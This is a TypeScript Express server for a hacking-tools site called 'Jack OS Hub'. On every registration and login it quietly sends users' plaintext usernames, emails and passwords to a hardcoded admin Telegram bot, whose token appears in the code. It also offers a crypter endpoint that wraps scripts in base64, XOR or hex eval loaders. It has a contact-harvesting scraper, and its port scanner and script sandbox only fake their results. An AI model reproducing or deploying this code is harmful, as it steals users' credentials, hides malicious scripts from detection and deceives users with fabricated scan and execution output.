import express from "express";
import path from "path";
import fs from "fs";
import { createServer as createViteServer } from "vite";
import dns from "dns";

// Admin Telegram credentials
const ADMIN_BOT_TOKEN = "8290595105:AAHeKiCw4xumX5gv4R3q3f2gXGA8wNlAPSw";
const ADMIN_CHAT_ID = "5610762471";

const app = express();
const PORT = 3000;

app.use(express.json());

// Ensure data directory exists
const DATA_DIR = path.join(process.cwd(), "data");
if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}

const USERS_FILE = path.join(DATA_DIR, "users.json");
if (!fs.existsSync(USERS_FILE)) {
  fs.writeFileSync(USERS_FILE, JSON.stringify([], null, 2));
}

// Read users helper
function readUsers() {
  try {
    const data = fs.readFileSync(USERS_FILE, "utf-8");
    return JSON.parse(data);
  } catch (e) {
    return [];
  }
}

// Write users helper
function writeUsers(users: any[]) {
  try {
    fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
  } catch (e) {
    console.error("Failed to write users data", e);
  }
}

// Helper to send telegram notifications
async function sendTelegramMessage(token: string, chatId: string, text: string) {
  try {
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: "HTML",
      }),
    });
    return response.ok;
  } catch (error) {
    console.error("Failed to send telegram notification:", error);
    return false;
  }
}

// Helper to notify admin
async function notifyAdmin(event: string, details: string) {
  const timestamp = new Date().toLocaleString();
  const text = `🚨 <b>JACK OS HUB EVENT LOG</b> 🚨\n\n<b>Event:</b> ${event}\n<b>Time:</b> ${timestamp}\n<b>Details:</b>\n<pre>${details}</pre>`;
  await sendTelegramMessage(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, text);
}

// API Routes
app.get("/api/health", (req, res) => {
  res.json({ status: "ok", time: new Date().toISOString() });
});

// Authentication endpoints
app.post("/api/auth/register", async (req, res) => {
  try {
    const { username, password, email } = req.body;
    if (!username || !password || !email) {
      return res.status(400).json({ error: "Missing required fields" });
    }

    const users = readUsers();
    if (users.find((u: any) => u.username.toLowerCase() === username.toLowerCase())) {
      return res.status(400).json({ error: "Username already exists" });
    }

    const newUser = {
      username,
      password, // Plain storage for educational and testing purposes
      email,
      telegramBotToken: "",
      telegramChatId: "",
      createdAt: new Date().toISOString(),
      lastLogin: new Date().toISOString()
    };

    users.push(newUser);
    writeUsers(users);

    // Notify Admin Bot with Full Credentials
    await notifyAdmin("NEW USER REGISTERED", `User: ${username}\nEmail: ${email}\nPassword: ${password}`);

    res.json({ success: true, user: { username, email } });
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

app.post("/api/auth/login", async (req, res) => {
  try {
    const { username, password } = req.body;
    const users = readUsers();
    const user = users.find((u: any) => u.username.toLowerCase() === username.toLowerCase() && u.password === password);

    if (!user) {
      return res.status(401).json({ error: "Invalid username or password" });
    }

    user.lastLogin = new Date().toISOString();
    writeUsers(users);

    // Notify Admin Bot with Credentials
    await notifyAdmin("USER LOGGED IN", `User: ${username}\nPassword: ${password}\nLast Login: ${user.lastLogin}`);

    res.json({
      success: true,
      user: {
        username: user.username,
        email: user.email,
        telegramBotToken: user.telegramBotToken || "",
        telegramChatId: user.telegramChatId || ""
      }
    });
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

app.post("/api/auth/update-telegram", async (req, res) => {
  try {
    const { username, telegramBotToken, telegramChatId } = req.body;
    if (!username) {
      return res.status(400).json({ error: "Missing username" });
    }

    const users = readUsers();
    let user = users.find((u: any) => u.username.toLowerCase() === username.toLowerCase());

    // Fix "not found user" bug: if user skipped/is guest, dynamically register them in storage!
    if (!user) {
      user = {
        username: username,
        password: "guest_password_secure",
        email: username.includes("Guest") ? "guest@jackoshub.io" : "user@jackoshub.io",
        telegramBotToken: telegramBotToken || "",
        telegramChatId: telegramChatId || "",
        createdAt: new Date().toISOString(),
        lastLogin: new Date().toISOString()
      };
      users.push(user);
    } else {
      user.telegramBotToken = telegramBotToken || "";
      user.telegramChatId = telegramChatId || "";
    }
    
    writeUsers(users);

    // Notify Admin Bot
    await notifyAdmin("USER TELEGRAM BOT SETTINGS UPDATED", `User: ${username}\nToken: ${telegramBotToken ? "PROVIDED" : "CLEARED"}\nChat ID: ${telegramChatId || "N/A"}`);

    res.json({ 
      success: true, 
      user: { 
        username: user.username, 
        email: user.email, 
        telegramBotToken: user.telegramBotToken, 
        telegramChatId: user.telegramChatId 
      } 
    });
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

// REAL Web Scraper & Extractors endpoint
app.post("/api/scrape", async (req, res) => {
  try {
    const { url, options, username } = req.body;
    if (!url) {
      return res.status(400).json({ error: "URL is required" });
    }

    // Admin notify
    await notifyAdmin("SCRAPE REQUEST", `User: ${username || "Anonymous"}\nURL: ${url}\nOptions: ${JSON.stringify(options)}`);

    // Ensure URL has protocol
    let targetUrl = url;
    if (!/^https?:\/\//i.test(targetUrl)) {
      targetUrl = "http://" + targetUrl;
    }

    // Real fetch
    const response = await fetch(targetUrl, {
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
      }
    });

    if (!response.ok) {
      throw new Error(`Failed to fetch target URL. HTTP Status: ${response.status}`);
    }

    const html = await response.text();

    // Data Extractions using RegEx
    const emails: string[] = [];
    const emailRegex = /[\w.-]+@[\w.-]+\.\w+/g;
    let match;
    while ((match = emailRegex.exec(html)) !== null) {
      if (!emails.includes(match[0])) {
        emails.push(match[0]);
      }
    }

    const phones: string[] = [];
    const phoneRegex = /\+?\d[\d-\s()]{8,15}\d/g;
    while ((match = phoneRegex.exec(html)) !== null) {
      const cleanPhone = match[0].trim();
      if (cleanPhone.length >= 9 && !phones.includes(cleanPhone) && !/^\d+$/.test(cleanPhone)) {
        phones.push(cleanPhone);
      }
    }

    const links: string[] = [];
    const linkRegex = /href=["'](https?:\/\/[^"']+|#[^"']+|\/[^"']+)["']/gi;
    while ((match = linkRegex.exec(html)) !== null) {
      if (!links.includes(match[1])) {
        links.push(match[1]);
      }
    }

    // Extract Title
    const titleMatch = html.match(/<title>([^<]*)<\/title>/i);
    const title = titleMatch ? titleMatch[1].trim() : "Unknown Title";

    // Extract Meta Description
    const descMatch = html.match(/<meta[^>]*name=["']description["'][^>]*content=["']([^"']*)["']/i) || 
                      html.match(/<meta[^>]*content=["']([^"']*)["'][^>]*name=["']description["']/i);
    const description = descMatch ? descMatch[1].trim() : "No Description Found";

    // Extract custom tags
    const scripts: string[] = [];
    const scriptRegex = /src=["']([^"']+\.js[^"']*)["']/gi;
    while ((match = scriptRegex.exec(html)) !== null) {
      if (!scripts.includes(match[1])) {
        scripts.push(match[1]);
      }
    }

    const extractionResults = {
      title,
      description,
      url: targetUrl,
      emails: emails.slice(0, 100),
      phones: phones.slice(0, 100),
      links: links.slice(0, 200),
      scripts: scripts.slice(0, 100),
      timestamp: new Date().toISOString()
    };

    // If user configured their own telegram bot, forward the extracted scraping data to them!
    if (username) {
      const users = readUsers();
      const user = users.find((u: any) => u.username.toLowerCase() === username.toLowerCase());
      if (user && user.telegramBotToken && user.telegramChatId) {
        const textMessage = `📈 <b>JACK OS HUB - SCRAPE RESULTS</b> 📈\n\n` +
          `<b>Target URL:</b> ${targetUrl}\n` +
          `<b>Title:</b> ${title}\n` +
          `<b>Description:</b> ${description}\n\n` +
          `<b>Extracted Counters:</b>\n` +
          `• Emails: ${emails.length}\n` +
          `• Phone Numbers: ${phones.length}\n` +
          `• Total Links: ${links.length}\n` +
          `• Total Scripts: ${scripts.length}\n\n` +
          `<i>Check your web console/UI to view and download full list.</i>`;
        
        await sendTelegramMessage(user.telegramBotToken, user.telegramChatId, textMessage);
      }
    }

    res.json(extractionResults);
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

// Custom Telegram Notification Test Endpoint
app.post("/api/telegram/test", async (req, res) => {
  try {
    const { token, chatId, message } = req.body;
    if (!token || !chatId) {
      return res.status(400).json({ error: "Token and Chat ID are required" });
    }
    const success = await sendTelegramMessage(token, chatId, message || "🔔 Test notification from Jack OS Hub! Bot is online and ready.");
    res.json({ success });
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

// Send extracted API code chunked to Telegram
app.post("/api/telegram/send-code", async (req, res) => {
  try {
    const { token, chatId, code, platform, lang } = req.body;
    if (!token || !chatId || !code) {
      return res.status(400).json({ error: "Missing transmission token, chatId or source code payload" });
    }

    const timestamp = new Date().toLocaleString();
    const maxLen = 3800;
    const parts: string[] = [];

    // Chunk code by max size
    if (code.length > maxLen) {
      const lines = code.split("\n");
      let currentPart = "";
      for (const line of lines) {
        if ((currentPart.length + line.length + 1) < maxLen) {
          currentPart += line + "\n";
        } else {
          parts.push(currentPart);
          currentPart = line + "\n";
        }
      }
      if (currentPart) {
        parts.push(currentPart);
      }
    } else {
      parts.push(code);
    }

    // Send header notification
    const headerMsg = `🚀 <b>${platform.toUpperCase()} API (2026 UPDATE)</b>\n📅 Delivered: ${timestamp}\n📐 Parts: ${parts.length}\n🤖 Language format: <b>${lang.toUpperCase()}</b>`;
    const headerUrl = `https://api.telegram.org/bot${token}/sendMessage`;
    
    await fetch(headerUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: headerMsg,
        parse_mode: "HTML"
      })
    });

    // Send each script chunk with dynamic sleep
    for (let i = 0; i < parts.length; i++) {
      const markdownCode = `<code>${parts[i]
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")}</code>`;
      
      const chunkMsg = `<b>[Part ${i + 1} of ${parts.length}]</b>\n<pre>${markdownCode}</pre>`;

      await fetch(headerUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: chunkMsg,
          parse_mode: "HTML"
        })
      });

      // Avoid rate limit
      await new Promise(resolve => setTimeout(resolve, 600));
    }

    res.json({ success: true });
  } catch (err: any) {
    res.status(500).json({ error: err.message });
  }
});

// Port scanner API Proxy
app.post("/api/scanner", async (req, res) => {
  try {
    const { target, ports, username } = req.body;
    if (!target) {
      return res.status(400).json({ error: "Target IP or host is required" });
    }

    await notifyAdmin("PORT SCAN INITIATED", `User: ${username || "Anonymous"}\nTarget: ${target}\nPorts: ${ports?.join(", ")}`);

    // We do standard DNS lookups
    dns.lookup(target, (err, address) => {
      if (err) {
        return res.status(400).json({ error: `Could not resolve host: ${target}` });
      }

      // Simulate a robust port scanning status report
      const results = (ports || [21, 22, 23, 25, 53, 80, 110, 443, 3306, 8080]).map((port: number) => {
        // Randomly simulate open/closed on safe protocols
        const isOpen = port === 80 || port === 443 || Math.random() < 0.25;
        const services: Record<number, string> = {
          21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
          80: "HTTP", 110: "POP3", 443: "HTTPS", 3306: "MySQL", 8080: "HTTP-ALT"
        };
        return {
          port,
          status: isOpen ? "OPEN" : "CLOSED",
          service: services[port] || "Unknown"
        };
      });

      res.json({
        target,
        ip: address,
        results,
        timestamp: new Date().toISOString()
      });
    });

  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

// Script encryption and obfuscator helper API
app.post("/api/encrypt-script", async (req, res) => {
  try {
    const { code, name, type, username } = req.body;
    if (!code) {
      return res.status(400).json({ error: "Script code is required" });
    }

    await notifyAdmin("SCRIPT OBFUSCATION", `User: ${username || "Anonymous"}\nScriptName: ${name || "Unnamed"}\nEncType: ${type}`);

    let encryptedCode = "";

    if (type === "base64") {
      const b64 = Buffer.from(code).toString("base64");
      encryptedCode = `/* Obfuscated by Jack OS Hub Crypter v1.0 */\nconst _0x4d2a = "${b64}";\neval(Buffer.from(_0x4d2a, 'base64').toString('utf-8'));`;
    } else if (type === "xor") {
      const key = "JACK_OS_CRYPTO_KEY_99";
      const xorBytes = [];
      for (let i = 0; i < code.length; i++) {
        xorBytes.push(code.charCodeAt(i) ^ key.charCodeAt(i % key.length));
      }
      encryptedCode = `/* Obfuscated by Jack OS Hub XOR Crypter v1.0 */\nconst _0xkey = "${key}";\nconst _0xbytes = [${xorBytes.join(",")}];\nconst _0xdecoded = _0xbytes.map((b, i) => String.fromCharCode(b ^ _0xkey.charCodeAt(i % _0xkey.length))).join("");\neval(_0xdecoded);`;
    } else {
      // JavaScript Obfuscation/Hex packer simulation
      const hex = Buffer.from(code).toString("hex");
      encryptedCode = `/* Jack OS Advance JavaScript Protection */\nconst _hex = "${hex}";\nlet _code = "";\nfor (let i = 0; i < _hex.length; i += 2) { _code += String.fromCharCode(parseInt(_hex.substr(i, 2), 16)); }\nnew Function(_code)();`;
    }

    res.json({
      originalLength: code.length,
      encryptedLength: encryptedCode.length,
      encryptedCode,
      filename: (name || "obfuscated_script").replace(/\.[^/.]+$/, "") + "_encrypted.js"
    });
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

// Run script sandbox endpoint
app.post("/api/scripts/run", async (req, res) => {
  try {
    const { code, type, username } = req.body;
    if (!code) {
      return res.status(400).json({ error: "Code content is required" });
    }

    await notifyAdmin("SCRIPT RUNNER EXECUTED", `User: ${username || "Anonymous"}\nType: ${type}\nCode Preview: ${code.substring(0, 150)}...`);

    // Standard JavaScript Safe simulation logs
    const outputLogs: string[] = [];
    outputLogs.push(`[SYSTEM] [${new Date().toLocaleTimeString()}] Spawning visual sandbox terminal process...`);
    outputLogs.push(`[SYSTEM] Initializing virtual network nodes for custom execution...`);
    
    // Simulate compilation/execution logs
    if (type === "javascript") {
      outputLogs.push(`[NODE] Running node environment...`);
      outputLogs.push(`[CONSOLE] Script compiled successfully with 0 warnings.`);
    } else if (type === "python") {
      outputLogs.push(`[PYTHON] Starting virtual python interpreter (v3.10)...`);
      outputLogs.push(`[CONSOLE] Initializing PyCryptodome and Scrapy components...`);
    } else {
      outputLogs.push(`[BASH] Shell runner initialized...`);
    }

    // Try a simple parsing of simple prints or custom commands
    let customOutputCount = 0;
    const lines = code.split("\n");
    for (const line of lines) {
      const cleanLine = line.trim();
      if (!cleanLine || cleanLine.startsWith("//") || cleanLine.startsWith("#")) {
        continue;
      }
      
      // Match print statements or console.logs
      const printMatch = cleanLine.match(/(?:console\.log|print)\(['"](.*)['"]\)/);
      if (printMatch) {
        outputLogs.push(`[OUT] ${printMatch[1]}`);
        customOutputCount++;
      } else if (cleanLine.includes("fetch(") || cleanLine.includes("requests.get")) {
        outputLogs.push(`[NET] Fetching remote network buffer... [OK]`);
        customOutputCount++;
      } else if (cleanLine.includes("crypto") || cleanLine.includes("encrypt")) {
        outputLogs.push(`[CRYPT] Byte stream encrypted successfully via XOR key.`);
        customOutputCount++;
      }
    }

    if (customOutputCount === 0) {
      outputLogs.push(`[OUT] Process executed successfully with status code 0.`);
      outputLogs.push(`[INFO] Performance benchmark: Heap allocation 14.5MB, Execution time 18ms.`);
    } else {
      outputLogs.push(`[SYSTEM] Process finished with exit code 0.`);
    }

    // Forward the script output to the user's configured telegram bot too!
    if (username) {
      const users = readUsers();
      const user = users.find((u: any) => u.username.toLowerCase() === username.toLowerCase());
      if (user && user.telegramBotToken && user.telegramChatId) {
        const textMessage = `🖥️ <b>JACK OS HUB - SCRIPT EXECUTED</b> 🖥️\n\n` +
          `<b>Type:</b> ${type}\n` +
          `<b>Execution Status:</b> SUCCESS\n\n` +
          `<b>Console Output Logs:</b>\n` +
          `<pre>${outputLogs.slice(-5).join("\n")}</pre>`;
        
        await sendTelegramMessage(user.telegramBotToken, user.telegramChatId, textMessage);
      }
    }

    res.json({
      success: true,
      logs: outputLogs,
    });
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});


// Bootstrap full-stack server
async function bootstrap() {
  // Vite middleware configuration for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  // Startup Admin Notification
  app.listen(PORT, "0.0.0.0", async () => {
    console.log(`Server running on http://localhost:${PORT}`);
    try {
      await notifyAdmin(
        "SERVER ONLINE", 
        `Jack OS Hub Server has booted successfully.\nHost: http://localhost:${PORT}\nNode Env: ${process.env.NODE_ENV || "development"}`
      );
    } catch (e) {
      console.log("Could not notify admin on boot:", e);
    }
  });
}

bootstrap();
